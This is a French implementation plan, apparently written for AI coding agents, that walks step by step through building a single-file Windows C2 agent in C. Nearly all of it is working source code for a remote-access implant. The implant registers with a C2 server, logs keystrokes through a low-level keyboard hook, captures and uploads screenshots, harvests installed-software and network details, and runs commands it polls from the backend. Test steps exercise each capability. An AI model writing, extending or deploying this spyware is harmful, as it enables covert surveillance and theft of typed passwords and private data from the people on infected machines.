# Agent C Rewrite Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Réécrire l'agent C2 en un seul fichier `agent/agent.c` utilisant uniquement des APIs Windows système (WinINet, GDI32, iphlpapi, registre).

**Architecture:** Un seul thread — boucle `PeekMessage` + timer de polling toutes les 3s. Le hook clavier `WH_KEYBOARD_LL` reçoit ses callbacks grâce à `PeekMessage`. Toutes les fonctions sont statiques dans `agent.c`.

**Tech Stack:** C (C99), MinGW GCC, WinINet (HTTP), GDI32 (screenshot BMP), iphlpapi (réseau), Registre Windows (apps + OS version), `SetWindowsHookEx` WH_KEYBOARD_LL (keylogger).

---

## Fichiers concernés

| Action   | Fichier                                        | Responsabilité                          |
|----------|------------------------------------------------|-----------------------------------------|
| Créer    | `agent/config.h`                               | Constantes C2 (host, port, intervalles) |
| Créer    | `agent/Makefile`                               | Compilation MinGW                       |
| Créer    | `agent/agent.c`                                | Tout le code de l'agent                 |
| Modifier | `server/backend/routes/machines.py`            | Ajouter `net_config` aux commandes autorisées |

---

## Task 1 — Backend : autoriser la commande `net_config`

**Files:**
- Modify: `server/backend/routes/machines.py:9-13`

- [ ] **Step 1 : Ajouter `net_config` à `ALLOWED_COMMANDS`**

Remplacer le set `ALLOWED_COMMANDS` existant :

```python
ALLOWED_COMMANDS = {
    'screenshot', 'start_keylog', 'stop_keylog',
    'apps', 'net_config',
    'files:Documents', 'files:Images', 'files:Videos', 'files:Bureau',
}
```

- [ ] **Step 2 : Vérifier que le backend démarre sans erreur**

```bash
cd server/backend
python run.py
```

Résultat attendu : `* Running on http://0.0.0.0:5000`

- [ ] **Step 3 : Commit**

```bash
git add server/backend/routes/machines.py
git commit -m "feat(backend): allow net_config command"
```

---

## Task 2 — `config.h` + `Makefile`

**Files:**
- Create: `agent/config.h`
- Create: `agent/Makefile`

- [ ] **Step 1 : Créer `agent/config.h`**

```c
#pragma once

#define C2_HOST           "192.168.1.100"
#define C2_PORT           5000
#define POLL_INTERVAL_MS  3000
#define KEYLOG_BUF_SIZE   65536
```

> Adapter `C2_HOST` à l'IP de la machine qui fait tourner le backend.

- [ ] **Step 2 : Créer `agent/Makefile`**

```makefile
CC      = gcc
CFLAGS  = -Wall -O2 -DWINVER=0x0600 -D_WIN32_WINNT=0x0600
LIBS    = -lwininet -liphlpapi -lgdi32 -lws2_32

all: agent.exe

agent.exe: agent.c config.h
	$(CC) $(CFLAGS) agent.c -o agent.exe $(LIBS)

clean:
	del agent.exe
```

> Si cross-compilation depuis Linux : remplacer `CC = gcc` par `CC = x86_64-w64-mingw32-gcc` et `del` par `rm -f`.

- [ ] **Step 3 : Commit**

```bash
git add agent/config.h agent/Makefile
git commit -m "feat(agent): add config.h and Makefile"
```

---

## Task 3 — Squelette `agent.c` (includes + globals + main vide)

**Files:**
- Create: `agent/agent.c`

- [ ] **Step 1 : Créer `agent/agent.c` avec les includes et les globales**

```c
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "config.h"

/* globals keylogger */
static HHOOK  g_hook         = NULL;
static char   g_keylog_buf[KEYLOG_BUF_SIZE];
static int    g_keylog_pos   = 0;
static BOOL   g_keylog_active = FALSE;

/* machine_id assigné par le backend au /report */
static int g_machine_id = -1;

int main(void) {
    return 0;
}
```

- [ ] **Step 2 : Compiler pour vérifier que les includes sont OK**

```bash
cd agent
make
```

Résultat attendu : `agent.exe` créé sans erreur.

- [ ] **Step 3 : Commit**

```bash
git add agent/agent.c
git commit -m "feat(agent): add skeleton with includes and globals"
```

---

## Task 4 — Couche HTTP (WinINet)

**Files:**
- Modify: `agent/agent.c` — ajouter les fonctions HTTP avant `main`

- [ ] **Step 1 : Ajouter `http_request` (fonction interne)**

Insérer avant `main` :

```c
/* Fonction interne : envoie une requête HTTP et lit la réponse.
   Retourne le nombre d'octets lus, ou -1 en cas d'erreur. */
static int http_request(const char *method, const char *path,
                        const char *body, DWORD body_len,
                        const char *content_type,
                        char *out_buf, int out_sz)
{
    HINTERNET hInet = InternetOpenA("agent/1.0",
                                    INTERNET_OPEN_TYPE_DIRECT,
                                    NULL, NULL, 0);
    if (!hInet) return -1;

    HINTERNET hConn = InternetConnectA(hInet, C2_HOST, C2_PORT,
                                       NULL, NULL,
                                       INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) { InternetCloseHandle(hInet); return -1; }

    HINTERNET hReq = HttpOpenRequestA(hConn, method, path,
                                      NULL, NULL, NULL,
                                      INTERNET_FLAG_RELOAD |
                                      INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hReq) {
        InternetCloseHandle(hConn);
        InternetCloseHandle(hInet);
        return -1;
    }

    char headers[256] = "";
    if (content_type)
        snprintf(headers, sizeof(headers),
                 "Content-Type: %s\r\n", content_type);

    BOOL ok = HttpSendRequestA(hReq,
                               headers[0] ? headers : NULL, (DWORD)-1,
                               (LPVOID)body, body_len);

    int total = 0;
    if (ok && out_buf) {
        DWORD read = 0;
        while (InternetReadFile(hReq, out_buf + total,
                                out_sz - total - 1, &read) && read > 0)
            total += read;
        out_buf[total] = '\0';
    }

    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);
    InternetCloseHandle(hInet);
    return ok ? total : -1;
}
```

- [ ] **Step 2 : Ajouter les fonctions publiques HTTP**

```c
static int http_get(const char *path, char *out, int sz) {
    return http_request("GET", path, NULL, 0, NULL, out, sz);
}

static int http_post_json(const char *path, const char *json,
                          char *out, int out_sz) {
    return http_request("POST", path, json, (DWORD)strlen(json),
                        "application/json", out, out_sz);
}

static int http_post_raw(const char *path,
                         const char *data, DWORD data_len,
                         const char *ct) {
    return http_request("POST", path, data, data_len, ct, NULL, 0);
}

/* Upload multipart/form-data d'un fichier binaire (ex: screenshot.bmp) */
static int http_post_file(const char *path,
                          const char *filepath,
                          const char *field_name)
{
    HANDLE hFile = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return -1;

    DWORD file_sz = GetFileSize(hFile, NULL);
    char *file_data = (char *)malloc(file_sz);
    if (!file_data) { CloseHandle(hFile); return -1; }

    DWORD rd;
    ReadFile(hFile, file_data, file_sz, &rd, NULL);
    CloseHandle(hFile);

    const char *boundary = "----AgentBoundary7A3F";
    const char *filename  = strrchr(filepath, '\\');
    filename = filename ? filename + 1 : filepath;

    char hdr[512];
    snprintf(hdr, sizeof(hdr),
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"%s\"; filename=\"%s\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n",
        boundary, field_name, filename);

    char ftr[128];
    snprintf(ftr, sizeof(ftr), "\r\n--%s--\r\n", boundary);

    DWORD hdr_len = (DWORD)strlen(hdr);
    DWORD ftr_len = (DWORD)strlen(ftr);
    DWORD total   = hdr_len + file_sz + ftr_len;
    char *body    = (char *)malloc(total);
    if (!body) { free(file_data); return -1; }

    memcpy(body,                    hdr,       hdr_len);
    memcpy(body + hdr_len,          file_data, file_sz);
    memcpy(body + hdr_len + file_sz, ftr,      ftr_len);
    free(file_data);

    char ct[128];
    snprintf(ct, sizeof(ct),
             "multipart/form-data; boundary=%s", boundary);

    int ret = http_request("POST", path, body, total, ct, NULL, 0);
    free(body);
    return ret;
}
```

- [ ] **Step 3 : Compiler**

```bash
make
```

Résultat attendu : zéro erreur, zéro warning.

- [ ] **Step 4 : Commit**

```bash
git add agent/agent.c
git commit -m "feat(agent): add WinINet HTTP layer"
```

---

## Task 5 — Infos système (`get_hostname`, `get_os_version`)

**Files:**
- Modify: `agent/agent.c` — ajouter après les fonctions HTTP

- [ ] **Step 1 : Ajouter les fonctions système**

```c
static void get_hostname(char *buf, int sz) {
    DWORD dw = (DWORD)sz;
    if (!GetComputerNameA(buf, &dw))
        strncpy(buf, "unknown", sz - 1);
}

/* Lit ProductName + CurrentBuildNumber depuis le registre.
   GetVersionEx est déprécié sur Windows 8.1+, le registre est plus fiable. */
static void get_os_version(char *buf, int sz) {
    HKEY hKey;
    char product[128] = "Windows";
    char build[32]    = "0";

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
            0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD type, len;
        len = sizeof(product);
        RegQueryValueExA(hKey, "ProductName",
                         NULL, &type, (BYTE *)product, &len);
        len = sizeof(build);
        RegQueryValueExA(hKey, "CurrentBuildNumber",
                         NULL, &type, (BYTE *)build, &len);
        RegCloseKey(hKey);
    }
    snprintf(buf, sz, "%s (Build %s)", product, build);
}
```

- [ ] **Step 2 : Compiler**

```bash
make
```

Résultat attendu : zéro erreur.

- [ ] **Step 3 : Commit**

```bash
git add agent/agent.c
git commit -m "feat(agent): add system info functions"
```

---

## Task 6 — Infos réseau (`get_private_ip`, `get_public_ip`, `get_net_config`)

**Files:**
- Modify: `agent/agent.c` — ajouter après les fonctions système

- [ ] **Step 1 : Ajouter les fonctions réseau**

```c
/* Première IP privée non-nulle trouvée sur les interfaces */
static void get_private_ip(char *buf, int sz) {
    IP_ADAPTER_INFO adapters[16];
    DWORD out_sz = sizeof(adapters);

    if (GetAdaptersInfo(adapters, &out_sz) == NO_ERROR) {
        PIP_ADAPTER_INFO p = adapters;
        while (p) {
            const char *ip = p->IpAddressList.IpAddress.String;
            if (strcmp(ip, "0.0.0.0") != 0) {
                strncpy(buf, ip, sz - 1);
                buf[sz - 1] = '\0';
                return;
            }
            p = p->Next;
        }
    }
    strncpy(buf, "unknown", sz - 1);
    buf[sz - 1] = '\0';
}

/* Appel à api.ipify.org pour l'IP publique */
static void get_public_ip(char *buf, int sz) {
    HINTERNET hInet = InternetOpenA("agent/1.0",
                                    INTERNET_OPEN_TYPE_DIRECT,
                                    NULL, NULL, 0);
    if (!hInet) { strncpy(buf, "unknown", sz - 1); return; }

    HINTERNET hUrl = InternetOpenUrlA(hInet,
                                      "http://api.ipify.org",
                                      NULL, 0,
                                      INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        InternetCloseHandle(hInet);
        strncpy(buf, "unknown", sz - 1);
        return;
    }
    DWORD read = 0;
    InternetReadFile(hUrl, buf, (DWORD)(sz - 1), &read);
    buf[read] = '\0';
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInet);
}

/* Retourne un tableau JSON de toutes les interfaces réseau :
   IP, masque, gateway pour chaque adaptateur.
   Le DNS global est récupéré via GetNetworkParams. */
static void get_net_config(char *out, int sz) {
    IP_ADAPTER_INFO adapters[16];
    DWORD adapt_sz = sizeof(adapters);

    /* DNS global */
    char dns[64] = "unknown";
    FIXED_INFO *fi = (FIXED_INFO *)malloc(sizeof(FIXED_INFO));
    if (fi) {
        DWORD fi_sz = sizeof(FIXED_INFO);
        if (GetNetworkParams(fi, &fi_sz) == NO_ERROR)
            strncpy(dns, fi->DnsServerList.IpAddress.String, sizeof(dns) - 1);
        free(fi);
    }

    int pos = 0;
    pos += snprintf(out + pos, sz - pos,
                    "{\"dns\":\"%s\",\"adapters\":[", dns);

    if (GetAdaptersInfo(adapters, &adapt_sz) == NO_ERROR) {
        PIP_ADAPTER_INFO p = adapters;
        int first = 1;
        while (p && pos < sz - 256) {
            if (!first) pos += snprintf(out + pos, sz - pos, ",");
            first = 0;
            pos += snprintf(out + pos, sz - pos,
                "{\"name\":\"%s\",\"ip\":\"%s\","
                "\"mask\":\"%s\",\"gateway\":\"%s\"}",
                p->Description,
                p->IpAddressList.IpAddress.String,
                p->IpAddressList.IpMask.String,
                p->GatewayList.IpAddress.String);
            p = p->Next;
        }
    }
    snprintf(out + pos, sz - pos, "]}");
}
```

- [ ] **Step 2 : Compiler**

```bash
make
```

Résultat attendu : zéro erreur.

- [ ] **Step 3 : Commit**

```bash
git add agent/agent.c
git commit -m "feat(agent): add network info functions"
```

---

## Task 7 — Screenshot BMP (GDI32)

**Files:**
- Modify: `agent/agent.c` — ajouter après les fonctions réseau

- [ ] **Step 1 : Ajouter `take_screenshot`**

```c
/* Capture l'écran principal, sauvegarde en BMP 24 bits.
   Retourne 0 si succès, -1 sinon. */
static int take_screenshot(const char *out_path) {
    FILE *f   = NULL;   /* init ici : goto cleanup doit trouver f initialisée */
    char *bits = NULL;

    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HDC     hScreen = GetDC(NULL);
    HDC     hMem    = CreateCompatibleDC(hScreen);
    HBITMAP hBmp    = CreateCompatibleBitmap(hScreen, w, h);
    HBITMAP hOld    = (HBITMAP)SelectObject(hMem, hBmp);

    BitBlt(hMem, 0, 0, w, h, hScreen, 0, 0, SRCCOPY);
    SelectObject(hMem, hOld);

    /* Récupère les pixels en RGB 24 bits (lignes de haut en bas) */
    BITMAPINFOHEADER bih;
    ZeroMemory(&bih, sizeof(bih));
    bih.biSize        = sizeof(BITMAPINFOHEADER);
    bih.biWidth       = w;
    bih.biHeight      = -h;   /* négatif = top-down */
    bih.biPlanes      = 1;
    bih.biBitCount    = 24;
    bih.biCompression = BI_RGB;

    DWORD row_sz = ((DWORD)(w * 3) + 3) & ~3u;
    DWORD img_sz = row_sz * (DWORD)h;
    bits = (char *)malloc(img_sz);
    if (!bits) goto cleanup;

    GetDIBits(hScreen, hBmp, 0, (UINT)h,
              bits, (BITMAPINFO *)&bih, DIB_RGB_COLORS);

    /* Écrit le fichier BMP */
    BITMAPFILEHEADER bfh;
    ZeroMemory(&bfh, sizeof(bfh));
    bfh.bfType    = 0x4D42;  /* 'BM' */
    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bfh.bfSize    = bfh.bfOffBits + img_sz;

    f = fopen(out_path, "wb");
    if (f) {
        fwrite(&bfh, sizeof(bfh), 1, f);
        fwrite(&bih, sizeof(bih), 1, f);
        fwrite(bits, img_sz, 1, f);
        fclose(f);
    }
    free(bits);

cleanup:
    DeleteObject(hBmp);
    DeleteDC(hMem);
    ReleaseDC(NULL, hScreen);
    return f ? 0 : -1;
}
```

- [ ] **Step 2 : Compiler**

```bash
make
```

Résultat attendu : zéro erreur.

- [ ] **Step 3 : Commit**

```bash
git add agent/agent.c
git commit -m "feat(agent): add GDI32 screenshot (BMP 24-bit)"
```

---

## Task 8 — Keylogger (`WH_KEYBOARD_LL`)

**Files:**
- Modify: `agent/agent.c` — ajouter après `take_screenshot`

- [ ] **Step 1 : Ajouter le hook callback et les fonctions start/stop**

```c
/* Hook bas niveau — appelé par Windows pour chaque frappe clavier.
   Nécessite que le thread installeur ait une boucle de messages (PeekMessage). */
static LRESULT CALLBACK keyboard_hook_proc(int nCode,
                                            WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN && g_keylog_active) {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;
        UINT vk = kb->vkCode;
        char key[32] = "";

        /* Essaie de convertir en caractère Unicode */
        BYTE ks[256] = {0};
        GetKeyboardState(ks);
        WCHAR wc[4] = {0};
        if (ToUnicode(vk, kb->scanCode, ks, wc, 4, 0) == 1 && wc[0] >= 32) {
            if (wc[0] < 128)
                key[0] = (char)wc[0], key[1] = '\0';
            else
                snprintf(key, sizeof(key), "[U+%04X]", (unsigned)wc[0]);
        } else {
            switch (vk) {
                case VK_RETURN:  strcpy(key, "\n");    break;
                case VK_BACK:    strcpy(key, "[BS]");  break;
                case VK_TAB:     strcpy(key, "\t");    break;
                case VK_SPACE:   strcpy(key, " ");     break;
                case VK_DELETE:  strcpy(key, "[DEL]"); break;
                case VK_ESCAPE:  strcpy(key, "[ESC]"); break;
                /* Touches mortes / modificateurs : on ignore */
                case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT:
                case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL:
                case VK_MENU:    break;
                default:
                    snprintf(key, sizeof(key), "[VK%02X]", vk);
                    break;
            }
        }

        int len = (int)strlen(key);
        if (len > 0 && g_keylog_pos + len < KEYLOG_BUF_SIZE - 1) {
            memcpy(g_keylog_buf + g_keylog_pos, key, len);
            g_keylog_pos += len;
            g_keylog_buf[g_keylog_pos] = '\0';
        }
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

static void start_keylog(void) {
    if (g_hook) return;  /* déjà actif */
    g_keylog_pos    = 0;
    g_keylog_buf[0] = '\0';
    g_hook          = SetWindowsHookEx(WH_KEYBOARD_LL,
                                       keyboard_hook_proc, NULL, 0);
    g_keylog_active = TRUE;
}

/* Arrête le hook et envoie le buffer accumulé au backend */
static void stop_keylog(void) {
    if (!g_hook) return;
    g_keylog_active = FALSE;
    UnhookWindowsHookEx(g_hook);
    g_hook = NULL;

    if (g_keylog_pos > 0) {
        char path[64];
        snprintf(path, sizeof(path),
                 "/api/machines/%d/keylog", g_machine_id);
        http_post_raw(path, g_keylog_buf, (DWORD)g_keylog_pos,
                      "text/plain; charset=utf-8");
    }
    g_keylog_pos = 0;
}
```

- [ ] **Step 2 : Compiler**

```bash
make
```

Résultat attendu : zéro erreur.

- [ ] **Step 3 : Commit**

```bash
git add agent/agent.c
git commit -m "feat(agent): add WH_KEYBOARD_LL keylogger"
```

---

## Task 9 — Applications installées (`get_installed_apps`)

**Files:**
- Modify: `agent/agent.c` — ajouter après les fonctions keylogger

- [ ] **Step 1 : Ajouter `get_installed_apps`**

```c
/* Parcourt les deux clés Uninstall du registre (64 et 32 bits)
   et retourne un tableau JSON [{name, version}, ...] */
static void get_installed_apps(char *out, int sz) {
    static const char *REG_KEYS[] = {
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        NULL
    };

    int pos   = 0;
    int first = 1;
    pos += snprintf(out + pos, sz - pos, "[");

    for (int k = 0; REG_KEYS[k]; k++) {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, REG_KEYS[k],
                          0, KEY_READ, &hKey) != ERROR_SUCCESS)
            continue;

        char sub[256];
        DWORD idx = 0;
        while (pos < sz - 512 &&
               RegEnumKeyA(hKey, idx++, sub, sizeof(sub)) == ERROR_SUCCESS) {
            HKEY hSub;
            if (RegOpenKeyExA(hKey, sub, 0, KEY_READ, &hSub) != ERROR_SUCCESS)
                continue;

            char name[256]    = "";
            char version[64]  = "";
            DWORD type, len;

            len = sizeof(name);
            RegQueryValueExA(hSub, "DisplayName",
                             NULL, &type, (BYTE *)name, &len);
            len = sizeof(version);
            RegQueryValueExA(hSub, "DisplayVersion",
                             NULL, &type, (BYTE *)version, &len);
            RegCloseKey(hSub);

            if (name[0] == '\0') continue;

            /* Échappe les guillemets dans les chaînes */
            for (int i = 0; name[i];    i++) if (name[i]    == '"') name[i]    = '\'';
            for (int i = 0; version[i]; i++) if (version[i] == '"') version[i] = '\'';

            if (!first) pos += snprintf(out + pos, sz - pos, ",");
            first = 0;
            pos += snprintf(out + pos, sz - pos,
                            "{\"name\":\"%s\",\"version\":\"%s\"}",
                            name, version);
        }
        RegCloseKey(hKey);
    }
    snprintf(out + pos, sz - pos, "]");
}
```

- [ ] **Step 2 : Compiler**

```bash
make
```

Résultat attendu : zéro erreur.

- [ ] **Step 3 : Commit**

```bash
git add agent/agent.c
git commit -m "feat(agent): add installed apps via registry"
```

---

## Task 10 — Registration + boucle principale + dispatch

**Files:**
- Modify: `agent/agent.c` — remplacer le `main` vide par l'implémentation complète

- [ ] **Step 1 : Ajouter `do_register` et `handle_command` avant `main`**

```c
/* Envoie les infos de la machine au backend et retourne le machine_id.
   Retourne -1 en cas d'échec. */
static int do_register(void) {
    char hostname[256], os[256], priv_ip[64], pub_ip[64];
    get_hostname(hostname, sizeof(hostname));
    get_os_version(os, sizeof(os));
    get_private_ip(priv_ip, sizeof(priv_ip));
    get_public_ip(pub_ip, sizeof(pub_ip));

    char json[1024];
    snprintf(json, sizeof(json),
        "{\"hostname\":\"%s\",\"os_info\":\"%s\","
        "\"private_ip\":\"%s\",\"public_ip\":\"%s\"}",
        hostname, os, priv_ip, pub_ip);

    char resp[256] = "";
    if (http_post_json("/api/machines/report", json, resp, sizeof(resp)) < 0)
        return -1;

    /* Parse {"id": N} manuellement */
    const char *p = strstr(resp, "\"id\":");
    return p ? atoi(p + 5) : -1;
}

/* Exécute une commande reçue du backend */
static void handle_command(const char *cmd) {
    char path[64];

    if (strcmp(cmd, "screenshot") == 0) {
        const char *tmp = "screenshot.bmp";
        if (take_screenshot(tmp) == 0) {
            snprintf(path, sizeof(path),
                     "/api/machines/%d/upload", g_machine_id);
            http_post_file(path, tmp, "file");
            DeleteFileA(tmp);
        }

    } else if (strcmp(cmd, "start_keylog") == 0) {
        start_keylog();
        snprintf(path, sizeof(path),
                 "/api/machines/%d/result", g_machine_id);
        http_post_json(path, "{\"result\":\"keylog started\"}", NULL, 0);

    } else if (strcmp(cmd, "stop_keylog") == 0) {
        stop_keylog();
        snprintf(path, sizeof(path),
                 "/api/machines/%d/result", g_machine_id);
        http_post_json(path, "{\"result\":\"keylog sent\"}", NULL, 0);

    } else if (strcmp(cmd, "apps") == 0) {
        char *buf  = (char *)malloc(65536);
        char *json = (char *)malloc(65536 + 32);
        get_installed_apps(buf, 65536);
        snprintf(json, 65536 + 32, "{\"result\":%s}", buf);
        snprintf(path, sizeof(path),
                 "/api/machines/%d/result", g_machine_id);
        http_post_json(path, json, NULL, 0);
        free(buf); free(json);

    } else if (strcmp(cmd, "net_config") == 0) {
        char *buf  = (char *)malloc(16384);
        char *json = (char *)malloc(16384 + 32);
        get_net_config(buf, 16384);
        snprintf(json, 16384 + 32, "{\"result\":%s}", buf);
        snprintf(path, sizeof(path),
                 "/api/machines/%d/result", g_machine_id);
        http_post_json(path, json, NULL, 0);
        free(buf); free(json);
    }
    /* Les commandes files:* sont ignorées (hors scope de cette version) */
}
```

- [ ] **Step 2 : Remplacer le `main` vide par l'implémentation finale**

```c
int main(void) {
    g_machine_id = do_register();
    if (g_machine_id < 0) return 1;

    DWORD last_poll = 0;
    MSG   msg;

    while (1) {
        /* Traite les messages Windows — requis pour WH_KEYBOARD_LL */
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        /* Polling du backend toutes les POLL_INTERVAL_MS */
        DWORD now = GetTickCount();
        if (now - last_poll >= POLL_INTERVAL_MS) {
            last_poll = now;

            char poll_path[64];
            snprintf(poll_path, sizeof(poll_path),
                     "/api/machines/%d/command", g_machine_id);

            char resp[256] = "";
            http_get(poll_path, resp, sizeof(resp));

            /* Parse {"command": "xxx"} ou {"command": null} */
            const char *p = strstr(resp, "\"command\":");
            if (p) {
                p += 10;
                while (*p == ' ') p++;
                if (*p == '"') {
                    p++;
                    char cmd[64];
                    int i = 0;
                    while (*p && *p != '"' && i < 63)
                        cmd[i++] = *p++;
                    cmd[i] = '\0';
                    if (i > 0) handle_command(cmd);
                }
            }
        }

        Sleep(50);
    }
    return 0;
}
```

- [ ] **Step 3 : Compiler**

```bash
make
```

Résultat attendu : `agent.exe` généré, zéro erreur, zéro warning critique.

- [ ] **Step 4 : Commit**

```bash
git add agent/agent.c
git commit -m "feat(agent): add registration, main loop, and command dispatch"
```

---

## Task 11 — Test fonctionnel complet

- [ ] **Step 1 : Lancer le backend**

```bash
cd server/backend
python run.py
```

- [ ] **Step 2 : Vérifier que l'agent se register**

Lancer `agent.exe` sur la machine cible (ou la même machine).

Ouvrir `http://localhost:5000/api/machines` dans un navigateur ou avec curl :

```bash
curl http://localhost:5000/api/machines
```

Résultat attendu : JSON contenant une entrée avec `hostname`, `os_info`, `private_ip`, `public_ip`.

- [ ] **Step 3 : Tester la commande `apps`**

```bash
curl -X POST http://localhost:5000/api/machines/1/command \
     -H "Content-Type: application/json" \
     -d "{\"command\": \"apps\"}"
```

Attendre ~3s (intervalle de poll), puis :

```bash
curl http://localhost:5000/api/machines/1/result
```

Résultat attendu : JSON avec un tableau d'applications installées.

- [ ] **Step 4 : Tester `net_config`**

```bash
curl -X POST http://localhost:5000/api/machines/1/command \
     -H "Content-Type: application/json" \
     -d "{\"command\": \"net_config\"}"
```

Attendre ~3s, puis `GET /result`. Résultat attendu : JSON avec `dns` + tableau `adapters`.

- [ ] **Step 5 : Tester le screenshot**

```bash
curl -X POST http://localhost:5000/api/machines/1/command \
     -H "Content-Type: application/json" \
     -d "{\"command\": \"screenshot\"}"
```

Attendre ~3s, puis `GET /result`. Résultat attendu : `{"result":{"type":"file","filename":"screenshot.bmp"}}`.

Télécharger le fichier : `http://localhost:5000/api/machines/1/download/screenshot.bmp`

- [ ] **Step 6 : Tester le keylogger**

Envoyer `start_keylog`, taper du texte, envoyer `stop_keylog`.

Vérifier que `server/backend/uploads/1/keylog.txt` contient les frappes.

- [ ] **Step 7 : Commit final**

```bash
git add agent/
git commit -m "feat(agent): complete single-file C agent (WinINet, GDI32, keylogger, registry)"
```
